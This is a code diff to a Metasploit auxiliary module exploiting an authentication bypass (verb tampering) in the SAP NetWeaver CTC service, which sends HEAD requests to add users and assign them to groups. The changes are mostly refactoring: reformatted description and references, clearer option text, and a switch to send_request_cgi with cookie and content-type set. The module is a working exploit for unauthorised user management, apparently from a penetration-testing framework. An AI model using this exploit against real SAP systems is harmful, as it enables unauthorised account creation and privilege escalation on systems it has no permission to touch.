@@ -33,20 +33,23 @@ class Metasploit4 < Msf::Auxiliary
 		super(
 			'Name' => 'SAP CTC Service Verb Tampering (add user and add role)',
 			'Description' => %q{
-									This module exploits an authentication bypass vulnerability in SAP NetWeaver CTC service.
-									The service is vulnerable to verb tampering and allows for unauthorised user management.
-									SAP Note 1589525, 1624450 / DSECRG-11-041.
-								},
-			'References' => [['URL','http://erpscan.com/advisories/dsecrg-11-041-sap-netweaver-authentication-bypass-verb-tampering/']],
+					This module exploits an authentication bypass vulnerability in SAP NetWeaver
+				CTC service. The service is vulnerable to verb tampering and allows for unauthorised
+				user management. SAP Note 1589525, 1624450 / DSECRG-11-041.
+			},
+			'References' =>
+				[
+					[ 'URL', 'http://erpscan.com/advisories/dsecrg-11-041-sap-netweaver-authentication-bypass-verb-tampering/' ]
+				],
 			'Author' => ['nmonkee'],
 			'License' => MSF_LICENSE
 			)
 
 		register_options([
-			OptString.new('USER', [true, 'Username', nil]),
-			OptString.new('PASS', [true, 'Password', nil]),
-			OptString.new('GROUP', [true, 'Group', nil])
-			], self.class)
+			OptString.new('USER', [true, 'Username to create']),
+			OptString.new('PASS', [true, 'Password for the new user']),
+			OptString.new('GROUP', [true, 'Group for the new user'])
+		], self.class)
 	end
 
 	def run_host(ip)
@@ -58,22 +61,23 @@ class Metasploit4 < Msf::Auxiliary
 
 	def send_request(uri)
 		begin
-			print_status("[SAP] #{rhost}:#{rport} - sending request")
-			res = send_request_raw({
+			vprint_status("#{rhost}:#{rport} - Sending request to the CTC service...")
+			res = send_request_cgi({
 				'uri' => uri,
 				'method' => 'HEAD',
-				'headers' =>{
-					'Cookie' => 'sap-usercontext=sap-language=EN',
-					'Content-Type' => 'text/xml; charset=UTF-8',}
-				}, 45)
+				'ctype' => 'text/xml; charset=UTF-8',
+				'cookie' => 'sap-usercontext=sap-language=EN'
+			})
 			if res
-				vprint_error("[SAP] #{rhost}:#{rport} - Error code: " + res.code.to_s)
-				vprint_error("[SAP] #{rhost}:#{rport} - Error title: " + res.message.to_s)
-				vprint_error("[SAP] #{rhost}:#{rport} - Error message: " + res.body.to_s)
+				vprint_error("#{rhost}:#{rport} - Error code: " + res.code.to_s)
+				vprint_error("#{rhost}:#{rport} - Error title: " + res.message.to_s)
+				vprint_error("#{rhost}:#{rport} - Error message: " + res.body.to_s)
+			else
+				print_good("User successfully added")
 			end
-			rescue ::Rex::ConnectionError
-				print_error("#{rhost}:#{rport} - Unable to connect")
-				return
-			end
+		rescue ::Rex::ConnectionError
+			print_error("#{rhost}:#{rport} - Unable to connect")
+			return
+		end
 		end
 	end
